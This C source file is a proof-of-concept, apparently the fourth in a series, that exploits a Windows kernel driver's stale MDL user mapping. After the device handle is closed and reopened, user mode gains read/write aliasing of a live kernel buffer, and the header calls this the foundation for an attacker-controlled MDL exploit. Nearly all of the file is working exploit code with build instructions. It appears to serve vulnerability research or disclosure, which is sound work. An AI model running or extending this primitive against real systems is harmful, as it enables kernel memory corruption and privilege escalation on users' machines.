/*
 * 04_live_alias.c — Live Buffer Aliasing Across CloseHandle/Reopen
 * =================================================================
 *
 * What this demonstrates:
 *   When the device is closed and re‑opened, the driver allocates a
 *   new kernel buffer.  Due to LFH caching, the new buffer lands on
 *   the SAME physical page as the old one.  The stale mapping from
 *   the first open thus aliases the LIVE buffer of the second open.
 *   This gives bidire​ctional read/write access to a live kernel
 *   buffer from user mode.
 *
 * This mechanism is the foundation for the extended‑MDL exploit:
 *   modify buffer header fields through stale VA -> driver reads
 *   corrupted fields -> creates attacker‑controlled MDL.
 *
 * How to build:
 *   gcc -O2 -DUNICODE -D_WIN32_WINNT=0x0600 -o 04_live_alias.exe \
 *       04_live_alias.c -lsetupapi -static
 *
 * Safety: restores original data, cleans up properly.  No BSOD risk.
 */

#include "device.h"
#include <stdio.h>
#include <stdlib.h>


int main(void) {
    printf("============================================================\n");
    printf(" PoC 04: Live Buffer Aliasing\n");
    printf("============================================================\n\n");
    Sleep(1000);

    /* ---- Round 1: create the stale mapping ---- */

    printf("--- Round 1: Create Stale Mapping ---\n");

    HANDLE device1 = openDevice();

    if (device1 == INVALID_HANDLE_VALUE) {
        printf("[fail] cannot open device.\n");
        return 1;
    }

    DWORD bytesReturned;
    BYTE  mapOutput[64];
    DWORD mapFlag = 1;

    if (!sendIoctl(device1, IOCTL_MDL_MAP,
                   &mapFlag, sizeof(mapFlag),
                   mapOutput, sizeof(mapOutput), &bytesReturned)) {
        printf("[fail] IOCTL_MDL_MAP failed: %lu\n", GetLastError());
        CloseHandle(device1);
        return 2;
    }

    ULONGLONG staleUserVA = *(ULONGLONG *)(mapOutput + 0);

    if (staleUserVA == 0) {
        printf("[fail] no MDL created (output is zeros).\n");
        printf("[hint] the driver's buffer pointer may be NULL.\n");
        printf("[hint] start an audio stream first.\n");
        CloseHandle(device1);
        return 3;
    }

    BYTE *stalePage = (BYTE *)(ULONG_PTR)staleUserVA;

    printf("[ok]     stale VA: 0x%016llX\n", staleUserVA);

    /* save the original first 256 bytes for restoration later */
    BYTE originalData[256];

    for (int i = 0; i < 256; i++) {
        originalData[i] = stalePage[i];
    }

    /* write a unique marker at offset 0x40 to identify this page */
    DWORD marker = GetTickCount() + 0xBEEF1234;

    printf("[write]  marker 0x%08X at offset 0x40\n", marker);
    *(volatile DWORD *)(stalePage + 0x40) = marker;

    DWORD verified = *(volatile DWORD *)(stalePage + 0x40);

    printf("[ok]     verify: 0x%08X (%s)\n",
           verified, verified == marker ? "matches" : "FAILED");

    /* close WITHOUT cleaning up the MDL — this creates the stale mapping */
    CloseHandle(device1);
    Sleep(300);

    /* check the marker survives CloseHandle */
    DWORD afterClose = *(volatile DWORD *)(stalePage + 0x40);

    printf("[ok]     after close: marker = 0x%08X\n", afterClose);

    /* ---- Round 2: re‑open and check for aliasing ---- */

    printf("\n--- Round 2: Re‑Open & Check Aliasing ---\n");

    HANDLE device2 = openDevice();

    if (device2 == INVALID_HANDLE_VALUE) {
        printf("[fail] cannot re‑open device.\n");
        return 4;
    }

    mapFlag = 1;

    if (!sendIoctl(device2, IOCTL_MDL_MAP,
                   &mapFlag, sizeof(mapFlag),
                   mapOutput, sizeof(mapOutput), &bytesReturned)) {
        printf("[fail] IOCTL_MDL_MAP failed on re‑open: %lu\n",
               GetLastError());
        CloseHandle(device2);
        return 5;
    }

    ULONGLONG liveUserVA = *(ULONGLONG *)(mapOutput + 0);
    BYTE *livePage = (BYTE *)(ULONG_PTR)liveUserVA;

    printf("[ok]     live VA: 0x%016llX\n", liveUserVA);

    /* the key test: is our marker visible through the new mapping? */
    DWORD markerInNewBuffer = *(volatile DWORD *)(livePage + 0x40);

    printf("\n  marker in new buffer: 0x%08X\n", markerInNewBuffer);

    if (markerInNewBuffer == marker) {
        printf("\n");
        printf("  ====================================\n");
        printf("  |  LIVE BUFFER ALIASING CONFIRMED  |\n");
        printf("  ====================================\n");
        printf("\n");

        /* demo bidire​ctional read/write */
        printf("[demo] write via stale -> read via live:\n");

        *(volatile DWORD *)(stalePage + 0x50) = 0xABCD1234;
        DWORD readBack = *(volatile DWORD *)(livePage + 0x50);
        printf("  wrote 0xABCD1234, read 0x%08X (%s)\n",
               readBack, readBack == 0xABCD1234 ? "aliased" : "FAILED");

        printf("[demo] write via live -> read via stale:\n");

        *(volatile DWORD *)(livePage + 0x54) = 0xFEED5678;
        readBack = *(volatile DWORD *)(stalePage + 0x54);
        printf("  wrote 0xFEED5678, read 0x%08X (%s)\n",
               readBack, readBack == 0xFEED5678 ? "aliased" : "FAILED");
    } else {
        printf("\n[-]   no aliasing this round.\n");
        printf("[info]  the LFH allocator chose a different page.\n");
        printf("[hint]  try running the PoC again.\n");
    }

    /* ---- Restore original data ---- */

    printf("\n--- Restore & Cleanup ---\n");

    for (int i = 0; i < 256; i++) {
        *(volatile BYTE *)(stalePage + i) = originalData[i];
    }
    printf("[ok]   original data restored\n");

    DWORD cleanupFlag = 0;
    sendIoctl(device2, IOCTL_MDL_MAP,
              &cleanupFlag, sizeof(cleanupFlag),
              mapOutput, sizeof(mapOutput), &bytesReturned);

    CloseHandle(device2);
    printf("[ok]   done\n");
    return 0;
}

